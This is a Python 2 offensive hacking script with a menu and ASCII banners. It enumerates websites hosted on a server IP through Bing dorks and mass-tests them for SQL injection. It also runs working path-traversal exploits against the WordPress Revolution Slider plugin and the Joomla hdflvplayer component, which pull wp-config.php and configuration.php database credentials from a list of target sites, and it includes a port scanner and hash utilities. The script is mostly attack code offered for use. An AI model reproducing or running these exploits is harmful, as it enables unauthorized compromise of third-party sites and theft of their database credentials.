from platform import system
import time
import sys
import os
import httplib
import re
import urllib2
import urllib 
import socket
import requests
import httplib
import urlparse
import hashlib
def clear():
    if system() == 'Linux':
        os.system("clear")
    if system() == 'Windows':
        os.system('cls')
        os.system('color a')
    else:
        pass
clear()
banner =  """\033[0;37m
                     XXXXXXX
                    X  ***  X                XXXXX
                   X  *****  X            XXX     XX
                   X ******* X        XXXX          XX
                   X ******  XXXXXXXXX                XX 
                    X ****  X                           X
                    XX    XX                            X
                    //XXXX                              X
                   //   X                             XX
                  //    X          XXXXXXXXXXXXXXXXXXX
              XXX//    X          X                     \033[0;32m          
             X****X    X         X              
             X****X    X        X                Website > http://dev-labs.co
             X****X    X        X        ______   _______  _______  _______  _        _______ __________________ _______  _______ 
             X****X    X        X       (  __  \ / ___   )(  ____ \(  ____ )( \      (  ___  )\__   __/\__   __/(  ____ \(  ____ )
             X****X    X        X       | (  \  )\/   )  || (    \/| (    )|| (      | (   ) |   ) (      ) (   | (    \/| (    )|
             X****X    X        X       | |   ) |    /   )| (_____ | (____)|| |      | |   | |   | |      | |   | (__    | (____)|
             X****X    X        X       | |   | |   /   / (_____  )|  _____)| |      | |   | |   | |      | |   |  __)   |     __)
             X****X    X        X       | |   ) |  /   /        ) || (      | |      | |   | |   | |      | |   | (      | (\ (   \033[91m
             X****X    X        X       | (__/  ) /   (_/\/\____) || )      | (____/\| (___) |___) (___   | |   | (____/\| ) \ \__
             X****X    X        X       (______/ (_______/\_______)|/       (_______/(_______)\_______/   )_(   (_______/|/   \__/            
              X***X    X        X                 
               XXX      X        X               
                        X         X              Facebook > https://www.facebook.com/profile.php?id=100015309678072
                         X         XXXXXXXX    
                         XX                X     
                           XXXXXXXXXXXXXXXX    
        """
print banner

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)
def menu():
    home = '''
    \033[0;37m
1 >> Scan SQL Exploit
2 >> Get All Websites In Server
3 >> Get Wordpress Websites In Server
4 >> Get Joomla Websites In Server
5 >> Scan Exploit Get Config [Wordpress]
6 >> Scan Exploit Get Config [Joomla]
7 >> Port Scanner
8 >> Hash Encode
9 >> Exit
'''
    print home
slowprint("\033[0;37mThis Is Simple Script By Yacine Mohamed Trjn" + "\n Let's Start")
menu()
def exitt():
    ex = raw_input ('\033[0;37mContinue/Exit [C/E] -> ')
    if ex[0].upper() == 'E' :
           print 'Exiting!!!'
           exit()
    else:
           clear()
           print banner
           menu()
           choice()
def choice():
    yacine = raw_input ('Enter Your Choice >> ')
    if yacine == '1':
        def sql(srvip , filename ):
         srv= srvip
         fn =open(filename+'.txt','w')
         start=1
         end=101
         print "[Wait Scan Server]"
         while start<=end :
             try:
               bng = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A'+srv+"+php?id=&count=50&first="+str(start))
               bngg = open(bng[0])
               rdd=bngg.read()
               find=re.findall('<h2><a href="(.*?)"',rdd)
               start = start+50
             except IOError:
               print "[->] Network Error [<-]"
             try :
               for i in range(len(find)):
                       rez=find[i]+"'"
                       tst = urllib.urlretrieve(rez)
                       tstf = open(tst[0])
                       tstdd= tstf.read()
                       tstfind=re.findall('/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i|You have an error in your SQL syntax|Microsoft VBScript runtime error',tstdd)
                       if(tstfind):
                         print "[Injectable] -> "+ rez 
                         fn.write(rez + '\n')
             except :
                pass
         print "\033[0;32m Saved In "+ filename + ".txt"
        clear()
        print  """
.d8888.  .d88b.  db           .d8888. d88888b d8888b. db    db d88888b d8888b.      .d8888.  .o88b.  .d8b.  d8b   db d8b   db d88888b d8888b. 
88'  YP .8P  Y8. 88           88'  YP 88'     88  `8D 88    88 88'     88  `8D      88'  YP d8P  Y8 d8' `8b 888o  88 888o  88 88'     88  `8D 
`8bo.   88    88 88           `8bo.   88ooooo 88oobY' Y8    8P 88ooooo 88oobY'      `8bo.   8P      88ooo88 88V8o 88 88V8o 88 88ooooo 88oobY' 
  `Y8b. 88    88 88             `Y8b. 88~~~~~ 88`8b   `8b  d8' 88~~~~~ 88`8b          `Y8b. 8b      88~~~88 88 V8o88 88 V8o88 88~~~~~ 88`8b   
db   8D `8P  d8' 88booo.      db   8D 88.     88 `88.  `8bd8'  88.     88 `88.      db   8D Y8b  d8 88   88 88  V888 88  V888 88.     88 `88. 
`8888Y'  `Y88'Y8 Y88888P      `8888Y' Y88888P 88   YD    YP    Y88888P 88   YD      `8888Y'  `Y88P' YP   YP VP   V8P VP   V8P Y88888P 88   YD        
               """
        svr = raw_input("Server IP -> ")
        fn = raw_input("Filename -> ")
        sql(svr , fn )
        print " Finish!! "
        exitt()         
    elif yacine == '2':
        clear()
        def unique(seq):
            chf = set()
            return [chf.add(Y) or Y for Y in seq if Y not in chf]
        def getal(ip , filename) :
                print "[Wait Scanning Server]"
                fn =open(filename+'.txt','w')
                pg = 1
                ipsrv = ip
                wbs = []
                while pg <= 101:

                        try:
                                bng = "http://www.bing.com/search?q=ip%3A" + ipsrv + "+&count=50&first=" + str(pg)
                                obng = urllib2.urlopen(bng)
                                rbng = obng.read()
                                fwbs = re.findall('<h2><a href="(.*?)"', rbng)
                                for i in range(len(fwbs)):
                                        alcls = fwbs[i]
                                        findal = re.findall('http://(.*?)/', alcls)
                                        for xdd, itt in enumerate(findal):
                                          if 'www' not in itt:
                                            findal[xdd] = 'http://www.' + itt + '/'
                                          else:
                                            findal[xdd] = 'http://' + itt + '/'
                                        wbs.extend(findal)
                                pg += 50
                        except urllib2.URLError:
                                pass
                wbss = unique(wbs)
                print '->', len(wbs), 'Websites Founded <-'
                print "\033[0;32m Saved In "+filename+".txt"
                for site in wbss :
                        fn.write(urlparse.urlparse(site).netloc  + '\n')      
        print """
  ____    ___  ______       ____  _      _          __    __    ___  ____    _____ ____  ______    ___   _____
 /    T  /  _]|      T     /    T| T    | T        |  T__T  T  /  _]|    \  / ___/l    j|      T  /  _] / ___/
Y   __j /  [_ |      |    Y  o  || |    | |        |  |  |  | /  [_ |  o  )(   \_  |  T |      | /  [_ (   \_ 
|  T  |Y    _]l_j  l_j    |     || l___ | l___     |  |  |  |Y    _]|     T \__  T |  | l_j  l_jY    _] \__  T
|  l_ ||   [_   |  |      |  _  ||     T|     T    l  `  '  !|   [_ |  O  | /  \ | |  |   |  |  |   [_  /  \ |
|     ||     T  |  |      |  |  ||     ||     |     \      / |     T|     | \    | j  l   |  |  |     T \    |
l___,_jl_____j  l__j      l__j__jl_____jl_____j      \_/\_/  l_____jl_____j  \___j|____j  l__j  l_____j  \___j
"""
        svrip=raw_input("Server IP -> ")
        name=raw_input("Filename -> ")
        getal(svrip , name)
        exitt()
    elif yacine == '3':
        clear()
        def unique(seq):
            chf = set()
            return [chf.add(Y) or Y for Y in seq if Y not in chf]
        def wpget(ip , filename) :
                print "[Wait Scanning Server]"
                fn =open(filename+'.txt','w')
                pg = 1
                ipsrv = ip
                wbs = []
                while pg <= 101:
                        try:
                                bng = "http://www.bing.com/search?q=ip%3A" + ipsrv + "+?page_id=&count=50&first=" + str(pg)
                                obng = urllib2.urlopen(bng)
                                rbng = obng.read()
                                fwbs = re.findall('<h2><a href="(.*?)"', rbng)
                                for i in range(len(fwbs)):
                                        wpcls = fwbs[i]
                                        findwp = re.findall('(.*?)\?page_id=', wpcls)
                                        wbs.extend(findwp)
                                pg += 50
                        except:
                                pass
                wbs = unique(wbs)
                print '->', len(wbs), ' Wordpress Websites Founded <-'
                print "\033[0;32m Saved In "+filename+".txt"
                for site in wbs :
                        fn.write(urlparse.urlparse(site).netloc  + '\n')
        print """
  ________           __     __      __ __________   __      __         ___.            .__   __                   
 /  _____/   ____  _/  |_  /  \    /  \\______   \ /  \    /  \  ____  \_ |__    ______|__|_/  |_   ____    ______
/   \  ___ _/ __ \ \   __\ \   \/\/   / |     ___/ \   \/\/   /_/ __ \  | __ \  /  ___/|  |\   __\_/ __ \  /  ___/
\    \_\  \\  ___/  |  |    \        /  |    |      \        / \  ___/  | \_\ \ \___ \ |  | |  |  \  ___/  \___ \ 
 \______  / \___  > |__|     \__/\  /   |____|       \__/\  /   \___  > |___  //____  >|__| |__|   \___  >/____  >
        \/      \/                \/                      \/        \/      \/      \/                 \/      \/ 
        """
        svrip=raw_input("Server IP -> ")
        name=raw_input("Filename -> ")
        wpget(svrip , name)
        exitt()

    elif yacine == '4':
        clear()
        def unique(seq):
            chf = set()
            return [chf.add(Y) or Y for Y in seq if Y not in chf]
        def wpget(ip , filename) :
                print "[Wait Scanning Server]"
                fn =open(filename+'.txt','w')
                pg = 1
                ipsrv = ip
                wbs = []
                while pg <= 101:

                        try:
                                bng = "http://www.bing.com/search?q=ip%3A" + ipsrv + "+index.php?option=com&count=50&first=" + str(pg)
                                obng = urllib2.urlopen(bng)
                                rbng = obng.read()
                                fwbs = re.findall('<h2><a href="(.*?)"', rbng)
                                for i in range(len(fwbs)):
                                        jmcls = fwbs[i]
                                        findjm = re.findall('(.*?)index.php', jmcls)
                                        wbs.extend(findjm)
                                pg += 50
                        except:
                                pass
                wbs = unique(wbs)
                print '->', len(wbs), ' Joomla Websites Founded <-'
                print "\033[0;32m Saved In "+filename+".txt"
                for site in wbs :
                        fn.write(urlparse.urlparse(site).netloc  + '\n')
        print """
 ___          _      _                   _        _ _ _       _        _    _            
/  _>  ___  _| |_   | | ___  ___ ._ _ _ | | ___  | | | | ___ | |_  ___<_> _| |_  ___  ___
| <_/\/ ._>  | |   _| |/ . \/ . \| ' ' || |<_> | | | | |/ ._>| . \<_-<| |  | |  / ._><_-<
`____/\___.  |_|   \__/\___/\___/|_|_|_||_|<___| |__/_/ \___.|___//__/|_|  |_|  \___./__/
              """
        svrip=raw_input("Server IP -> ")
        name=raw_input("Filename -> ")
        wpget(svrip , name)
        exitt()
    elif yacine == '5':
       clear()
       print """
    ___                 _           ___                             ____   __                   _    _              
  ,"___".     ____     FJ_        ,"___".     ____      _ ___      / ___J  LJ     ___ _        F L  J J     _ ___   
  FJ---L]    F __ J   J  _|       FJ---L]    F __ J    J '__ J    J |_--'        F __` L      J J .. L L   J '__ J  
 J |  [""L  | _____J  | |-'      J |   LJ   | |--| |   | |__| |   |  _|    FJ   | |--| |      | |/  \| |   | |--| | 
 | \___] |  F L___--. F |__-.    | \___--.  F L__J J   F L  J J   F |_J   J  L  F L__J J      F   /\   J   F L__J J 
 J\_____/F J\______/F \_____/    J\_____/F J\______/F J__L  J__L J__F     J__L  )-____  L    J___//\\___L J  _____/L
  J_____F   J______F  J_____F     J_____F   J______F  |__L  J__| |__|     |__| J\______/F    |___/  \___| |_J_____F 
                                                                                J______F                  L_J       
                                                                                """
       payload = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
       try:
           fn = raw_input("Entre List Sites -> ")
           fn = open(fn, "r")
       except:
           print ("Noob Enter List Sites *_*")
       for dmn in fn:
           dmn = dmn.rstrip()
           try:
               if dmn[:7] == "http://":
                dmn = dmn.replace("http://", "")
               if dmn[:8] == "https://":
                dmn = dmn.replace("https://", "")
               if dmn[-1] == "/":
                dmn = dmn.replace("/", "")

               cwp = httplib.HTTPConnection(dmn)
               cwp.request("POST", payload)
               cwp = cwp.getresponse()
               fwp = cwp.read()
               if cwp.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in fwp:
                   print ("\033[0;32m Config Found -> "), dmn + payload
                   with open("WP_Config.txt", "a") as fnn:
                       fnn.writelines(dmn + payload + "\n")
                   print "\033[0;32m Saved In WP_Config.txt"
               else:
                   print("\033[91m Config Not Found -> "), dmn
           except:
               pass
       exitt()
    elif yacine == '6':
       clear()
       print """
   ______     __         __                      __         ______            _____      
  / ____/__  / /_       / /___  ____  ____ ___  / /___ _   / ____/___  ____  / __(_)___ _
 / / __/ _ \/ __/  __  / / __ \/ __ \/ __ `__ \/ / __ `/  / /   / __ \/ __ \/ /_/ / __ `/
/ /_/ /  __/ /_   / /_/ / /_/ / /_/ / / / / / / / /_/ /  / /___/ /_/ / / / / __/ / /_/ / 
\____/\___/\__/   \____/\____/\____/_/ /_/ /_/_/\__,_/   \____/\____/_/ /_/_/ /_/\__, /  
                                                                                /____/   
                                                                                """
       payload = "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php"
       try:
           fn = raw_input("Entre List Sites -> ")
           fn = open(fn, "r")
       except:
           print ("Noob Enter List Sites *_*")
       for dmn in fn:
           dmn = dmn.rstrip()
           try:
               if dmn[:7] == "http://":
                dmn = dmn.replace("http://", "")
               if dmn[:8] == "https://":
                dmn = dmn.replace("https://", "")
               if dmn[-1] == "/":
                dmn = dmn.replace("/", "")

               cjm = httplib.HTTPConnection(dmn)
               cjm.request("POST", payload)
               cjm = cjm.getresponse()
               fjm = cjm.read()
               if cjm.status == 200 and ("$user" and "$host" and "$password") in fjm:
                   print ("\033[0;32m Config Found -> "), dmn + payload
                   with open("JM_Config.txt", "a") as fnn:
                       fnn.writelines(dmn + payload + "\n")
                   print "\033[0;32m Saved In JM_Config.txt"
               else:
                   print("\033[91m Config Not Found -> "), dmn
           except:
               pass
       exitt()
    elif yacine == '7':
        clear()
        print """
 ______                      ______                                     
(_____ \             _      / _____)                                    
 _____) )__   ____ _| |_   ( (____   ____ _____ ____  ____  _____  ____ 
|  ____/ _ \ / ___|_   _)   \____ \ / ___|____ |  _ \|  _ \| ___ |/ ___)
| |   | |_| | |     | |_    _____) | (___/ ___ | | | | | | | ____| |    
|_|    \___/|_|      \__)  (______/ \____)_____|_| |_|_| |_|_____)_| 
              """
        rm    = raw_input("Enter Remote Host -> ")
        rmi  = socket.gethostbyname(rm)
        print "\033[0;32m [Wait Scan Server] -> ", rmi
        try:
           for prt in range(1,10000):  
               sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               rst = sck.connect_ex((rmi, prt))
               if rst == 0:
                   print "\033[94m Port {}  [->] Open [<-]".format(prt)
           sck.close()
           print "\033[0;32m [->]  Scannin Complete [<-]"
           exitt()
        except:
            pass
    elif yacine == '8':
        def menu():
            clear()
            print '''
888    888                   888           8888888888                                888          
888    888                   888           888                                       888          
888    888                   888           888                                       888          
8888888888  8888b.  .d8888b  88888b.       8888888    88888b.   .d8888b .d88b.   .d88888  .d88b.  
888    888     "88b 88K      888 "88b      888        888 "88b d88P"   d88""88b d88" 888 d8P  Y8b 
888    888 .d888888 "Y8888b. 888  888      888        888  888 888     888  888 888  888 88888888 
888    888 888  888      X88 888  888      888        888  888 Y88b.   Y88..88P Y88b 888 Y8b.     
888    888 "Y888888  88888P' 888  888      8888888888 888  888  "Y8888P "Y88P"   "Y88888  "Y8888 

1 >> MD5 Encode
2 >> SHA1 Encode
3 >> SHA256 Encode
4 >> SHA512 Encode
    '''
        menu()
        def Choce():
            yacine = raw_input('Enter Your Choice -> ')
            if yacine == '1':
                md5()
            elif yacine == '2':
                sha1()
            elif yacine == '3':
                sha256()
            elif yacine == '4':
                sha512()
        def md5():
            clear()
            print '''
888b     d888 8888888b.  888888888       8888888888                                888          
8888b   d8888 888  "Y88b 888             888                                       888          
88888b.d88888 888    888 888             888                                       888          
888Y88888P888 888    888 8888888b.       8888888    88888b.   .d8888b .d88b.   .d88888  .d88b.  
888 Y888P 888 888    888      "Y88b      888        888 "88b d88P"   d88""88b d88" 888 d8P  Y8b 
888  Y8P  888 888    888        888      888        888  888 888     888  888 888  888 88888888 
888   "   888 888  .d88P Y88b  d88P      888        888  888 Y88b.   Y88..88P Y88b 888 Y8b.     
888       888 8888888P"   "Y8888P"       8888888888 888  888  "Y8888P "Y88P"   "Y88888  "Y8888 
'''
            hsh = raw_input ('Enter Your Text To Encode MD5 -> \033[0;32m')
            ho = hashlib.md5(hsh.encode())
            print '*' * 100
            print ho.hexdigest()
            print '*' * 100
            exitt()
        def sha1():
            clear()
            print '''
 .d8888b.  888    888        d8888  d888        8888888888                                888          
d88P  Y88b 888    888       d88888 d8888        888                                       888          
Y88b.      888    888      d88P888   888        888                                       888          
 "Y888b.   8888888888     d88P 888   888        8888888    88888b.   .d8888b .d88b.   .d88888  .d88b.  
    "Y88b. 888    888    d88P  888   888        888        888 "88b d88P"   d88""88b d88" 888 d8P  Y8b 
      "888 888    888   d88P   888   888        888        888  888 888     888  888 888  888 88888888 
Y88b  d88P 888    888  d8888888888   888        888        888  888 Y88b.   Y88..88P Y88b 888 Y8b.     
 "Y8888P"  888    888 d88P     888 8888888      8888888888 888  888  "Y8888P "Y88P"   "Y88888  "Y8888
'''
            hsh = raw_input('Enter Your Text To Encode SHA1 -> \033[0;32m')
            ho = hashlib.sha1(hsh.encode())
            print '*' * 100
            print ho.hexdigest()
            print '*' * 100
            exitt()
        def sha256():
           clear()
           print '''
 .d8888b.  888    888        d8888  .d8888b.  888888888   .d8888b.       8888888888                                888          
d88P  Y88b 888    888       d88888 d88P  Y88b 888        d88P  Y88b      888                                       888          
Y88b.      888    888      d88P888        888 888        888             888                                       888          
 "Y888b.   8888888888     d88P 888      .d88P 8888888b.  888d888b.       8888888    88888b.   .d8888b .d88b.   .d88888  .d88b.  
    "Y88b. 888    888    d88P  888  .od888P"       "Y88b 888P "Y88b      888        888 "88b d88P"   d88""88b d88" 888 d8P  Y8b 
      "888 888    888   d88P   888 d88P"             888 888    888      888        888  888 888     888  888 888  888 88888888 
Y88b  d88P 888    888  d8888888888 888"       Y88b  d88P Y88b  d88P      888        888  888 Y88b.   Y88..88P Y88b 888 Y8b.     
 "Y8888P"  888    888 d88P     888 888888888   "Y8888P"   "Y8888P"       8888888888 888  888  "Y8888P "Y88P"   "Y88888  "Y8888  
'''
           hsh = raw_input('Enter Your Text To Encode SHA256 -> \033[0;32m')
           ho = hashlib.sha256(hsh.encode())
           print '*' * 100
           print ho.hexdigest()
           print '*' * 100
           exitt()
        def sha512():
           clear()
           print'''
 .d8888b.  888    888        d8888 888888888  d888    .d8888b.       8888888888                                888          
d88P  Y88b 888    888       d88888 888       d8888   d88P  Y88b      888                                       888          
Y88b.      888    888      d88P888 888         888          888      888                                       888          
 "Y888b.   8888888888     d88P 888 8888888b.   888        .d88P      8888888    88888b.   .d8888b .d88b.   .d88888  .d88b.  
    "Y88b. 888    888    d88P  888      "Y88b  888    .od888P"       888        888 "88b d88P"   d88""88b d88" 888 d8P  Y8b 
      "888 888    888   d88P   888        888  888   d88P"           888        888  888 888     888  888 888  888 88888888 
Y88b  d88P 888    888  d8888888888 Y88b  d88P  888   888"            888        888  888 Y88b.   Y88..88P Y88b 888 Y8b.     
 "Y8888P"  888    888 d88P     888  "Y8888P" 8888888 888888888       8888888888 888  888  "Y8888P "Y88P"   "Y88888  "Y8888 
'''
           hsh = raw_input('Enter Your Text To Encode SHA512 -> \033[0;32m')
           ho = hashlib.sha512(hsh.encode())
           print '*' * 100
           print ho.hexdigest()
           print '*' * 100
           exitt()
        Choce()
    elif yacine == '9':
        print 'Exiting!!!'
        exit()
choice()